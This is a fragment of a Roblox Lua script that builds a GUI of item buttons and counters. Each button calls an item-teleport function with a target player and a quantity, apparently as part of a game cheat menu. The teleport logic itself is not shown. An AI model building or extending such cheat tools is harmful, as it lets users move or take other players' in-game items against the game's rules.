BA.Position = UDim2.new(0, 5, 0, 2730)
BA.Size = UDim2.new(0, 100, 0, 100)
BA.Image = "rbxassetid://4478050327"
BA.MouseButton1Down:connect(function()
Type.Text = "2019CGift_Yellow_"
SingleItemTpQty("2019CGift_Yellow_", PlyrSelz.Text, qty.Text)
end)

CountItems144 = Instance.new("TextLabel")
CountItems144.Parent = MoveGifts
CountItems144.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems144.BackgroundTransparency = 0.6
CountItems144.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems144.Position = UDim2.new(0, 110, 0, 2785)
CountItems144.Size = UDim2.new(0, 25, 0, 20)
CountItems144.Font = Enum.Font.SourceSans
CountItems144.Text = "0"
CountItems144.TextColor3 = Color3.new(0, 1, 0) 
CountItems144.TextSize = 25 

Bb = Instance.new("ImageButton")
Bb.Name = "2017CGift_Modern"
Bb.Parent = MoveGifts
Bb.BackgroundColor3 = Color3.new(1, 1, 1)
Bb.BackgroundTransparency = 0
Bb.BorderColor3 = Color3.new(0.6, 0, 0)
Bb.Position = UDim2.new(0, 5, 0, 2835)
Bb.Size = UDim2.new(0, 100, 0, 100)
Bb.Image = "rbxassetid://4481531707"
Bb.MouseButton1Down:connect(function()
Type.Text = "2019CGift_Bowl"
SingleItemTpQty("2019CGift_Bowl", PlyrSelz.Text, qty.Text)
end)

CountItems145 = Instance.new("TextLabel")
CountItems145.Parent = MoveGifts
CountItems145.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems145.BackgroundTransparency = 0.6
CountItems145.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems145.Position = UDim2.new(0, 110, 0, 2890)
CountItems145.Size = UDim2.new(0, 25, 0, 20)
CountItems145.Font = Enum.Font.SourceSans
CountItems145.Text = "0"
CountItems145.TextColor3 = Color3.new(0, 1, 0)
CountItems145.TextSize = 25

Bc = Instance.new("ImageButton")
Bc.Name = "Bc"
Bc.Parent = MoveGifts
Bc.BackgroundColor3 = Color3.new(1, 1, 1)
Bc.BackgroundTransparency = 0
Bc.BorderColor3 = Color3.new(0.6, 0, 0)
Bc.Position = UDim2.new(0, 5, 0, 2940)
Bc.Size = UDim2.new(0, 100, 0, 100)
Bc.Image = "rbxassetid://4481538395"
Bc.MouseButton1Down:connect(function()
Type.Text = "2019CGift_Rusty"
SingleItemTpQty("2019CGift_Rusty", PlyrSelz.Text, qty.Text)
end)

CountItems146 = Instance.new("TextLabel")
CountItems146.Parent = MoveGifts
CountItems146.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems146.BackgroundTransparency = 0.6
CountItems146.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems146.Position = UDim2.new(0, 110, 0, 2995)
CountItems146.Size = UDim2.new(0, 25, 0, 20)
CountItems146.Font = Enum.Font.SourceSans
CountItems146.Text = "0"
CountItems146.TextColor3 = Color3.new(0, 1, 0)
CountItems146.TextSize = 25

Bd = Instance.new("ImageButton")
Bd.Name = "2019CGift_Cola"
Bd.Parent = MoveGifts
Bd.BackgroundColor3 = Color3.new(1, 1, 1)
Bd.BackgroundTransparency = 0
Bd.BorderColor3 = Color3.new(0.6, 0, 0)
Bd.Position = UDim2.new(0, 5, 0, 3045)
Bd.Size = UDim2.new(0, 100, 0, 100)
Bd.Image = "rbxassetid://4481531307"
Bd.MouseButton1Down:connect(function()
Type.Text = "2019CGift_Cola"
SingleItemTpQty("2019CGift_Cola", PlyrSelz.Text, qty.Text)
end)

CountItems147 = Instance.new("TextLabel")
CountItems147.Parent = MoveGifts
CountItems147.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems147.BackgroundTransparency = 0.6
CountItems147.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems147.Position = UDim2.new(0, 110, 0, 3100)
CountItems147.Size = UDim2.new(0, 25, 0, 20)
CountItems147.Font = Enum.Font.SourceSans
CountItems147.Text = "0"
CountItems147.TextColor3 = Color3.new(0, 1, 0)
CountItems147.TextSize = 25

Be = Instance.new("ImageButton")
Be.Name = "2019CGift_Burnt"
Be.Parent = MoveGifts
Be.BackgroundColor3 = Color3.new(1, 1, 1)
Be.BackgroundTransparency = 0
Be.BorderColor3 = Color3.new(0.6, 0, 0)
Be.Position = UDim2.new(0, 5, 0, 3150)
Be.Size = UDim2.new(0, 100, 0, 100)
Be.Image = "rbxassetid://4481530901"
Be.MouseButton1Down:connect(function()
Type.Text = "2019CGift_Burnt"
SingleItemTpQty("2019CGift_Burnt", PlyrSelz.Text, qty.Text)
end)

CountItems148 = Instance.new("TextLabel")
CountItems148.Parent = MoveGifts
CountItems148.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems148.BackgroundTransparency = 0.6
CountItems148.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems148.Position = UDim2.new(0, 110, 0, 3205)
CountItems148.Size = UDim2.new(0, 25, 0, 20)
CountItems148.Font = Enum.Font.SourceSans
CountItems148.Text = "0"
CountItems148.TextColor3 = Color3.new(0, 1, 0)
CountItems148.TextSize = 25

Bf = Instance.new("ImageButton")
Bf.Name = "2020CGift_Teal"
Bf.Parent = MoveGifts
Bf.BackgroundColor3 = Color3.new(1, 1, 1)
Bf.BackgroundTransparency = 0
Bf.BorderColor3 = Color3.new(0.6, 0, 0)
Bf.Position = UDim2.new(0, 5, 0, 3255)
Bf.Size = UDim2.new(0, 100, 0, 100)
Bf.Image = "rbxassetid://4481882133"
Bf.MouseButton1Down:connect(function()
Type.Text = "2020CGift_Teal"
SingleItemTpQty("2020CGift_Teal", PlyrSelz.Text, qty.Text)
end)

CountItems149 = Instance.new("TextLabel")
CountItems149.Parent = MoveGifts
CountItems149.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems149.BackgroundTransparency = 0.6
CountItems149.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems149.Position = UDim2.new(0, 110, 0, 3310)
CountItems149.Size = UDim2.new(0, 25, 0, 20)
CountItems149.Font = Enum.Font.SourceSans
CountItems149.Text = "0"
CountItems149.TextColor3 = Color3.new(0, 1, 0)
CountItems149.TextSize = 25

Bg = Instance.new("ImageButton")
Bg.Name = "2020CGift_Wobble"
Bg.Parent = MoveGifts
Bg.BackgroundColor3 = Color3.new(1, 1, 1)
Bg.BackgroundTransparency = 0
Bg.BorderColor3 = Color3.new(0.6, 0, 0)
Bg.Position = UDim2.new(0, 5, 0, 3360)
Bg.Size = UDim2.new(0, 100, 0, 100)
Bg.Image = "rbxassetid://4481882889"
Bg.MouseButton1Down:connect(function()
Type.Text = "2020CGift_Wobble"
SingleItemTpQty("2020CGift_Wobble", PlyrSelz.Text, qty.Text)
end)

CountItems150 = Instance.new("TextLabel")
CountItems150.Parent = MoveGifts
CountItems150.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems150.BackgroundTransparency = 0.6
CountItems150.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems150.Position = UDim2.new(0, 110, 0, 3415)
CountItems150.Size = UDim2.new(0, 25, 0, 20)
CountItems150.Font = Enum.Font.SourceSans
CountItems150.Text = "0"
CountItems150.TextColor3 = Color3.new(0, 1, 0)
CountItems150.TextSize = 25

Bh = Instance.new("ImageButton")
Bh.Name = "2020CGift_Cave"
Bh.Parent = MoveGifts
Bh.BackgroundColor3 = Color3.new(1, 1, 1)
Bh.BackgroundTransparency = 0
Bh.BorderColor3 = Color3.new(0.6, 0, 0)
Bh.Position = UDim2.new(0, 5, 0, 3465)
Bh.Size = UDim2.new(0, 100, 0, 100)
Bh.Image = "rbxassetid://4481881517"
Bh.MouseButton1Down:connect(function()
Type.Text = "2020CGift_Cave"
SingleItemTpQty("2020CGift_Cave", PlyrSelz.Text, qty.Text)
end)

CountItems151 = Instance.new("TextLabel")
CountItems151.Parent = MoveGifts
CountItems151.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems151.BackgroundTransparency = 0.6
CountItems151.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems151.Position = UDim2.new(0, 110, 0, 3520)
CountItems151.Size = UDim2.new(0, 25, 0, 20)
CountItems151.Font = Enum.Font.SourceSans
CountItems151.Text = "0"
CountItems151.TextColor3 = Color3.new(0, 1, 0)
CountItems151.TextSize = 25

Bi = Instance.new("ImageButton")
Bi.Name = "2021CGift_Black"
Bi.Parent = MoveGifts
Bi.BackgroundColor3 = Color3.new(1, 1, 1)
Bi.BackgroundTransparency = 0
Bi.BorderColor3 = Color3.new(0.6, 0, 0)
Bi.Position = UDim2.new(0, 5, 0, 3570)
Bi.Size = UDim2.new(0, 100, 0, 100)
Bi.Image = "rbxassetid://4481883427"
Bi.MouseButton1Down:connect(function()
Type.Text = "2021CGift_Black"
SingleItemTpQty("2021CGift_Black", PlyrSelz.Text, qty.Text)
end)

CountItems152 = Instance.new("TextLabel")
CountItems152.Parent = MoveGifts
CountItems152.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems152.BackgroundTransparency = 0.6
CountItems152.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems152.Position = UDim2.new(0, 110, 0, 3625)
CountItems152.Size = UDim2.new(0, 25, 0, 20)
CountItems152.Font = Enum.Font.SourceSans
CountItems152.Text = "0"
CountItems152.TextColor3 = Color3.new(0, 1, 0)
CountItems152.TextSize = 25

Bj = Instance.new("ImageButton")
Bj.Name = "2021CGift_Wobble"
Bj.Parent = MoveGifts
Bj.BackgroundColor3 = Color3.new(1, 1, 1)
Bj.BackgroundTransparency = 0
Bj.BorderColor3 = Color3.new(0.6, 0, 0)
Bj.Position = UDim2.new(0, 5, 0, 3675)
Bj.Size = UDim2.new(0, 100, 0, 100)
Bj.Image = "rbxassetid://4481883962"
Bj.MouseButton1Down:connect(function()
Type.Text = "2021CGift_Wobble"
SingleItemTpQty("2021CGift_Wobble", PlyrSelz.Text, qty.Text)
end)

CountItems153 = Instance.new("TextLabel")
CountItems153.Parent = MoveGifts
CountItems153.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems153.BackgroundTransparency = 0.6
CountItems153.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems153.Position = UDim2.new(0, 110, 0, 3730)
CountItems153.Size = UDim2.new(0, 25, 0, 20)
CountItems153.Font = Enum.Font.SourceSans
CountItems153.Text = "0"
CountItems153.TextColor3 = Color3.new(0, 1, 0)
CountItems153.TextSize = 25

MoveOther = Instance.new("ScrollingFrame")
MoveOther.Name = "MoveOther"
MoveOther.Parent = MenuFrame
MoveOther.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MoveOther.BackgroundTransparency = 0.5
MoveOther.Position =  UDim2.new(0, 179, 0, 0)
MoveOther.BorderColor3 = Color3.new(0, 0, 0)
MoveOther.Size = UDim2.new(0, 195, 0, 450)
MoveOther.CanvasPosition = Vector2.new(0,0)
MoveOther.CanvasSize = UDim2.new(0, 0, 0, 5050)
MoveOther.Visible = false

OtherMove = Instance.new("TextButton")
OtherMove.Name = "OtherMove"
OtherMove.Parent = MoveFrame
OtherMove.BackgroundColor3 = Color3.new(0, 0, 0)
OtherMove.BorderColor3 = Color3.new(1, 0, 0)
OtherMove.BackgroundTransparency = 0.6
OtherMove.Position =  UDim2.new(0, 3, 0, 257)
OtherMove.Size = UDim2.new(0, 164, 0, 20)
OtherMove.Font = Enum.Font.Fantasy
OtherMove.Text = "Other Items"
OtherMove.TextColor3 = Color3.new(1, 1, 1)
OtherMove.TextSize = 14
OtherMove.MouseButton1Click:connect(function()
MoveFrame.Visible = true
TimesFrame.Visible = false
PlyrSelz.Text = Player1z.Text
end)

CanOfCranberry = Instance.new("ImageButton")
CanOfCranberry.Name = "CanOfCranberry"
CanOfCranberry.Parent = MoveOther
CanOfCranberry.BackgroundColor3 = Color3.new(1, 1, 1)
CanOfCranberry.BackgroundTransparency = 0
CanOfCranberry.BorderColor3 = Color3.new(0.6, 0, 0)
CanOfCranberry.Position = UDim2.new(0, 5, 0, 5)
CanOfCranberry.Size = UDim2.new(0, 100, 0, 100)
CanOfCranberry.Image = "rbxassetid://4122884104"
CanOfCranberry.MouseButton1Down:connect(function()
Type.Text = "Can Of Cranberry"
SingleItemTpQty("CanOfCranberry", PlyrSelz.Text, qty.Text)
end)

CountItems154 = Instance.new("TextLabel")
CountItems154.Parent = MoveOther
CountItems154.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems154.BackgroundTransparency = 0.6
CountItems154.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems154.Position = UDim2.new(0, 110, 0, 55)
CountItems154.Size = UDim2.new(0, 25, 0, 20)
CountItems154.Font = Enum.Font.SourceSans
CountItems154.Text = "0"
CountItems154.TextColor3 = Color3.new(0, 1, 0)
CountItems154.TextSize = 25

BagOfCandy = Instance.new("ImageButton")
BagOfCandy.Name = "BagOfCandy"
BagOfCandy.Parent = MoveOther
BagOfCandy.BackgroundColor3 = Color3.new(1, 1, 1)
BagOfCandy.BackgroundTransparency = 0
BagOfCandy.BorderColor3 = Color3.new(0.6, 0, 0)
BagOfCandy.Position = UDim2.new(0, 5, 0, 105)
BagOfCandy.Size = UDim2.new(0, 100, 0, 100)
BagOfCandy.Image = "rbxassetid://4122880684"
BagOfCandy.MouseButton1Down:connect(function()
Type.Text = "Bag Of Candy"
SingleItemTpQty("BagOfCandy", PlyrSelz.Text, qty.Text)
end)

CountItems155 = Instance.new("TextLabel")
CountItems155.Parent = MoveOther
CountItems155.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems155.BackgroundTransparency = 0.6
CountItems155.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems155.Position = UDim2.new(0, 110, 0, 160)
CountItems155.Size = UDim2.new(0, 25, 0, 20)
CountItems155.Font = Enum.Font.SourceSans
CountItems155.Text = "0"
CountItems155.TextColor3 = Color3.new(0, 1, 0)
CountItems155.TextSize = 25

Candy = Instance.new("ImageButton")
Candy.Name = "Candy"
Candy.Parent = MoveOther
Candy.BackgroundColor3 = Color3.new(1, 1, 1)
Candy.BackgroundTransparency = 0
Candy.BorderColor3 = Color3.new(0.6, 0, 0)
Candy.Position = UDim2.new(0, 5, 0, 210)
Candy.Size = UDim2.new(0, 100, 0, 100)
Candy.Image = "rbxassetid://4122883233"
Candy.MouseButton1Down:connect(function()
Type.Text = "Candy"
SingleItemTpQty("Candy", PlyrSelz.Text, qty.Text)
end)

CountItems156 = Instance.new("TextLabel")
CountItems156.Parent = MoveOther
CountItems156.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems156.BackgroundTransparency = 0.6
CountItems156.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems156.Position = UDim2.new(0, 110, 0, 265)
CountItems156.Size = UDim2.new(0, 25, 0, 20)
CountItems156.Font = Enum.Font.SourceSans
CountItems156.Text = "0"
CountItems156.TextColor3 = Color3.new(0, 1, 0)
CountItems156.TextSize = 25

CandyCane = Instance.new("ImageButton")
CandyCane.Name = "CandyCane"
CandyCane.Parent = MoveOther
CandyCane.BackgroundColor3 = Color3.new(1, 1, 1)
CandyCane.BackgroundTransparency = 0
CandyCane.BorderColor3 = Color3.new(0.6, 0, 0)
CandyCane.Position = UDim2.new(0, 5, 0, 315)
CandyCane.Size = UDim2.new(0, 100, 0, 100)
CandyCane.Image = "rbxassetid://4122883691"
CandyCane.MouseButton1Down:connect(function()
Type.Text = "Candy Cane"
SingleItemTpQty("CandyCane", PlyrSelz.Text, qty.Text)
end)

CountItems157 = Instance.new("TextLabel")
CountItems157.Parent = MoveOther
CountItems157.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems157.BackgroundTransparency = 0.6
CountItems157.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems157.Position = UDim2.new(0, 110, 0, 370)
CountItems157.Size = UDim2.new(0, 25, 0, 20)
CountItems157.Font = Enum.Font.SourceSans
CountItems157.Text = "0"
CountItems157.TextColor3 = Color3.new(0, 1, 0)
CountItems157.TextSize = 25

Scoobis = Instance.new("ImageButton")
Scoobis.Name = "Scoobis"
Scoobis.Parent = MoveOther
Scoobis.BackgroundColor3 = Color3.new(1, 1, 1)
Scoobis.BackgroundTransparency = 0
Scoobis.BorderColor3 = Color3.new(0.6, 0, 0)
Scoobis.Position = UDim2.new(0, 5, 0, 420)
Scoobis.Size = UDim2.new(0, 100, 0, 100)
Scoobis.Image = "rbxassetid://4122888271"
Scoobis.MouseButton1Down:connect(function()
Type.Text = "Scoobis"
SingleItemTpQty("Scoobis", PlyrSelz.Text, qty.Text)
end)

CountItems158 = Instance.new("TextLabel")
CountItems158.Parent = MoveOther
CountItems158.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems158.BackgroundTransparency = 0.6
CountItems158.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems158.Position = UDim2.new(0, 110, 0, 475)
CountItems158.Size = UDim2.new(0, 25, 0, 20)
CountItems158.Font = Enum.Font.SourceSans
CountItems158.Text = "0"
CountItems158.TextColor3 = Color3.new(0, 1, 0)
CountItems158.TextSize = 25

Spork = Instance.new("ImageButton")
Spork.Name = "Spork"
Spork.Parent = MoveOther
Spork.BackgroundColor3 = Color3.new(1, 1, 1)
Spork.BackgroundTransparency = 0
Spork.BorderColor3 = Color3.new(0.6, 0, 0)
Spork.Position = UDim2.new(0, 5, 0, 525)
Spork.Size = UDim2.new(0, 100, 0, 100)
Spork.Image = "rbxassetid://3709645580"
Spork.MouseButton1Down:connect(function()
Type.Text = "Spork"
SingleItemTpQty("Spork", PlyrSelz.Text, qty.Text)
end)

CountItems159 = Instance.new("TextLabel")
CountItems159.Parent = MoveOther
CountItems159.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems159.BackgroundTransparency = 0.6
CountItems159.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems159.Position = UDim2.new(0, 110, 0, 580)
CountItems159.Size = UDim2.new(0, 25, 0, 20)
CountItems159.Font = Enum.Font.SourceSans
CountItems159.Text = "0"
CountItems159.TextColor3 = Color3.new(0, 1, 0)
CountItems159.TextSize = 25

CoalLump = Instance.new("ImageButton")
CoalLump.Name = "CoalLump"
CoalLump.Parent = MoveOther
CoalLump.BackgroundColor3 = Color3.new(1, 1, 1)
CoalLump.BackgroundTransparency = 0
CoalLump.BorderColor3 = Color3.new(0.6, 0, 0)
CoalLump.Position = UDim2.new(0, 5, 0, 630)
CoalLump.Size = UDim2.new(0, 100, 0, 100)
CoalLump.Image = "rbxassetid://3709645580"
CoalLump.MouseButton1Down:connect(function()
Type.Text = "Coal Lump"
SingleItemTpQty("CoalLump", PlyrSelz.Text, qty.Text)
end)

CountItems160 = Instance.new("TextLabel")
CountItems160.Parent = MoveOther
CountItems160.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems160.BackgroundTransparency = 0.6
CountItems160.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems160.Position = UDim2.new(0, 110, 0, 685)
CountItems160.Size = UDim2.new(0, 25, 0, 20)
CountItems160.Font = Enum.Font.SourceSans
CountItems160.Text = "0"
CountItems160.TextColor3 = Color3.new(0, 1, 0)
CountItems160.TextSize = 25

Snowball = Instance.new("ImageButton")
Snowball.Name = "Snowball"
Snowball.Parent = MoveOther
Snowball.BackgroundColor3 = Color3.new(1, 1, 1)
Snowball.BackgroundTransparency = 0
Snowball.BorderColor3 = Color3.new(0.6, 0, 0)
Snowball.Position = UDim2.new(0, 5, 0, 735)
Snowball.Size = UDim2.new(0, 100, 0, 100)
Snowball.Image = "rbxassetid://3710562126"
Snowball.MouseButton1Down:connect(function()
Type.Text = "Snowball"
SingleItemTpQty("Snowball", PlyrSelz.Text, qty.Text)
end)

CountItems161 = Instance.new("TextLabel")
CountItems161.Parent = MoveOther
CountItems161.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems161.BackgroundTransparency = 0.6
CountItems161.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems161.Position = UDim2.new(0, 110, 0, 790)
CountItems161.Size = UDim2.new(0, 25, 0, 20)
CountItems161.Font = Enum.Font.SourceSans
CountItems161.Text = "0"
CountItems161.TextColor3 = Color3.new(0, 1, 0)
CountItems161.TextSize = 25

Plate = Instance.new("ImageButton")
Plate.Name = "Plate"
Plate.Parent = MoveOther
Plate.BackgroundColor3 = Color3.new(1, 1, 1)
Plate.BackgroundTransparency = 0
Plate.BorderColor3 = Color3.new(0.6, 0, 0)
Plate.Position = UDim2.new(0, 5, 0, 840)
Plate.Size = UDim2.new(0, 100, 0, 100)
Plate.Image = "rbxassetid://3709635214"
Plate.MouseButton1Down:connect(function()
Type.Text = "Plate"
SingleItemTpQty("Plate", PlyrSelz.Text, qty.Text)
end)

CountItems162 = Instance.new("TextLabel")
CountItems162.Parent = MoveOther
CountItems162.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems162.BackgroundTransparency = 0.6
CountItems162.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems162.Position = UDim2.new(0, 110, 0, 895)
CountItems162.Size = UDim2.new(0, 25, 0, 20)
CountItems162.Font = Enum.Font.SourceSans
CountItems162.Text = "0"
CountItems162.TextColor3 = Color3.new(0, 1, 0)
CountItems162.TextSize = 25

Cocoa = Instance.new("ImageButton")
Cocoa.Name = "Cocoa"
Cocoa.Parent = MoveOther
Cocoa.BackgroundColor3 = Color3.new(1, 1, 1)
Cocoa.BackgroundTransparency = 0
Cocoa.BorderColor3 = Color3.new(0.6, 0, 0)
Cocoa.Position = UDim2.new(0, 5, 0, 945)
Cocoa.Size = UDim2.new(0, 100, 0, 100)
Cocoa.Image = "rbxassetid://4122884720"
Cocoa.MouseButton1Down:connect(function()
Type.Text = "Cocoa"
SingleItemTpQty("Cocoa", PlyrSelz.Text, qty.Text)
end)

CountItems163 = Instance.new("TextLabel")
CountItems163.Parent = MoveOther
CountItems163.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems163.BackgroundTransparency = 0.6
CountItems163.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems163.Position = UDim2.new(0, 110, 0, 1000)
CountItems163.Size = UDim2.new(0, 25, 0, 20)
CountItems163.Font = Enum.Font.SourceSans
CountItems163.Text = "0"
CountItems163.TextColor3 = Color3.new(0, 1, 0)
CountItems163.TextSize = 25

Duck = Instance.new("ImageButton")
Duck.Name = "Duck"
Duck.Parent = MoveOther
Duck.BackgroundColor3 = Color3.new(1, 1, 1)
Duck.BackgroundTransparency = 0
Duck.BorderColor3 = Color3.new(0.6, 0, 0)
Duck.Position = UDim2.new(0, 5, 0, 1050)
Duck.Size = UDim2.new(0, 100, 0, 100)
Duck.Image = "rbxassetid://3709589184"
Duck.MouseButton1Down:connect(function()
Type.Text = "Duck"
SingleItemTpQty("Duck", PlyrSelz.Text, qty.Text)
end)

CountItems164 = Instance.new("TextLabel")
CountItems164.Parent = MoveOther
CountItems164.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems164.BackgroundTransparency = 0.6
CountItems164.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems164.Position = UDim2.new(0, 110, 0, 1105)
CountItems164.Size = UDim2.new(0, 25, 0, 20)
CountItems164.Font = Enum.Font.SourceSans
CountItems164.Text = "0"
CountItems164.TextColor3 = Color3.new(0, 1, 0)
CountItems164.TextSize = 25

Cone = Instance.new("ImageButton")
Cone.Name = "Cone"
Cone.Parent = MoveOther
Cone.BackgroundColor3 = Color3.new(1, 1, 1)
Cone.BackgroundTransparency = 0
Cone.BorderColor3 = Color3.new(0.6, 0, 0)
Cone.Position = UDim2.new(0, 5, 0, 1155)
Cone.Size = UDim2.new(0, 100, 0, 100)
Cone.Image = "rbxassetid://4122885151"
Cone.MouseButton1Down:connect(function()
Type.Text = "Cone"
SingleItemTpQty("Cone", PlyrSelz.Text, qty.Text)
end)

CountItems165 = Instance.new("TextLabel")
CountItems165.Parent = MoveOther
CountItems165.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems165.BackgroundTransparency = 0.6
CountItems165.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems165.Position = UDim2.new(0, 110, 0, 1210)
CountItems165.Size = UDim2.new(0, 25, 0, 20)
CountItems165.Font = Enum.Font.SourceSans
CountItems165.Text = "0"
CountItems165.TextColor3 = Color3.new(0, 1, 0)
CountItems165.TextSize = 25

Toboggan = Instance.new("ImageButton")
Toboggan.Name = "Toboggan"
Toboggan.Parent = MoveOther
Toboggan.BackgroundColor3 = Color3.new(1, 1, 1)
Toboggan.BackgroundTransparency = 0
Toboggan.BorderColor3 = Color3.new(0.6, 0, 0)
Toboggan.Position = UDim2.new(0, 5, 0, 1260)
Toboggan.Size = UDim2.new(0, 100, 0, 100)
Toboggan.Image = "rbxassetid://4122889201"
Toboggan.MouseButton1Down:connect(function()
Type.Text = "Toboggan"
SingleItemTpQty("Toboggan", PlyrSelz.Text, qty.Text)
end)

CountItems166 = Instance.new("TextLabel")
CountItems166.Parent = MoveOther
CountItems166.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems166.BackgroundTransparency = 0.6
CountItems166.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems166.Position = UDim2.new(0, 110, 0, 1315)
CountItems166.Size = UDim2.new(0, 25, 0, 20)
CountItems166.Font = Enum.Font.SourceSans
CountItems166.Text = "0"
CountItems166.TextColor3 = Color3.new(0, 1, 0)
CountItems166.TextSize = 25

B1 = Instance.new("ImageButton")
B1.Name = "B1"
B1.Parent = MoveOther
B1.BackgroundColor3 = Color3.new(1, 1, 1)
B1.BackgroundTransparency = 0
B1.BorderColor3 = Color3.new(0.6, 0, 0)
B1.Position = UDim2.new(0, 5, 0, 1365)
B1.Size = UDim2.new(0, 100, 0, 100)
B1.Image = "rbxassetid://4100380550"
B1.MouseButton1Down:connect(function()
Type.Text = "Big Box"
SingleItemTpQty("B1", PlyrSelz.Text, qty.Text)
end)

CountItems167 = Instance.new("TextLabel")
CountItems167.Parent = MoveOther
CountItems167.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems167.BackgroundTransparency = 0.6
CountItems167.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems167.Position = UDim2.new(0, 110, 0, 1420)
CountItems167.Size = UDim2.new(0, 25, 0, 20)
CountItems167.Font = Enum.Font.SourceSans
CountItems167.Text = "0"
CountItems167.TextColor3 = Color3.new(0, 1, 0)
CountItems167.TextSize = 25

PumpkinClassic = Instance.new("ImageButton")
PumpkinClassic.Name = "PumpkinClassic"
PumpkinClassic.Parent = MoveOther
PumpkinClassic.BackgroundColor3 = Color3.new(1, 1, 1)
PumpkinClassic.BackgroundTransparency = 0
PumpkinClassic.BorderColor3 = Color3.new(0.6, 0, 0)
PumpkinClassic.Position = UDim2.new(0, 5, 0, 1470)
PumpkinClassic.Size = UDim2.new(0, 100, 0, 100)
PumpkinClassic.Image = "rbxassetid://3709636322"
PumpkinClassic.MouseButton1Down:connect(function()
Type.Text = "Pumpkin Classic"
SingleItemTpQty("PumpkinClassic", PlyrSelz.Text, qty.Text)
end)

CountItems168 = Instance.new("TextLabel")
CountItems168.Parent = MoveOther
CountItems168.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems168.BackgroundTransparency = 0.6
CountItems168.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems168.Position = UDim2.new(0, 110, 0, 1545)
CountItems168.Size = UDim2.new(0, 25, 0, 20)
CountItems168.Font = Enum.Font.SourceSans
CountItems168.Text = "0"
CountItems168.TextColor3 = Color3.new(0, 1, 0)
CountItems168.TextSize = 25

PumpkinDark = Instance.new("ImageButton")
PumpkinDark.Name = "PumpkinDark"
PumpkinDark.Parent = MoveOther
PumpkinDark.BackgroundColor3 = Color3.new(1, 1, 1)
PumpkinDark.BackgroundTransparency = 0
PumpkinDark.BorderColor3 = Color3.new(0.6, 0, 0)
PumpkinDark.Position = UDim2.new(0, 5, 0, 1575)
PumpkinDark.Size = UDim2.new(0, 100, 0, 100)
PumpkinDark.Image = "rbxassetid://3709636740"
PumpkinDark.MouseButton1Down:connect(function()
Type.Text = "Pumpkin Dark"
SingleItemTpQty("PumpkinDark", PlyrSelz.Text, qty.Text)
end)

CountItems169 = Instance.new("TextLabel")
CountItems169.Parent = MoveOther
CountItems169.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems169.BackgroundTransparency = 0.6
CountItems169.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems169.Position = UDim2.new(0, 110, 0, 1630)
CountItems169.Size = UDim2.new(0, 25, 0, 20)
CountItems169.Font = Enum.Font.SourceSans
CountItems169.Text = "0"
CountItems169.TextColor3 = Color3.new(0, 1, 0)
CountItems169.TextSize = 25

PumpkinGreen = Instance.new("ImageButton")
PumpkinGreen.Name = "PumpkinGreen"
PumpkinGreen.Parent = MoveOther
PumpkinGreen.BackgroundColor3 = Color3.new(1, 1, 1)
PumpkinGreen.BackgroundTransparency = 0
PumpkinGreen.BorderColor3 = Color3.new(0.6, 0, 0)
PumpkinGreen.Position = UDim2.new(0, 5, 0, 1680)
PumpkinGreen.Size = UDim2.new(0, 100, 0, 100)
PumpkinGreen.Image = "rbxassetid://4122887654"
PumpkinGreen.MouseButton1Down:connect(function()
Type.Text = "Pumpkin Green"
SingleItemTpQty("PumpkinGreen", PlyrSelz.Text, qty.Text)
end)

CountItems170 = Instance.new("TextLabel")
CountItems170.Parent = MoveOther
CountItems170.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems170.BackgroundTransparency = 0.6
CountItems170.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems170.Position = UDim2.new(0, 110, 0, 1735)
CountItems170.Size = UDim2.new(0, 25, 0, 20)
CountItems170.Font = Enum.Font.SourceSans
CountItems170.Text = "0"
CountItems170.TextColor3 = Color3.new(0, 1, 0)
CountItems170.TextSize = 25

PumpkinCursed = Instance.new("ImageButton")
PumpkinCursed.Name = "PumpkinCursed"
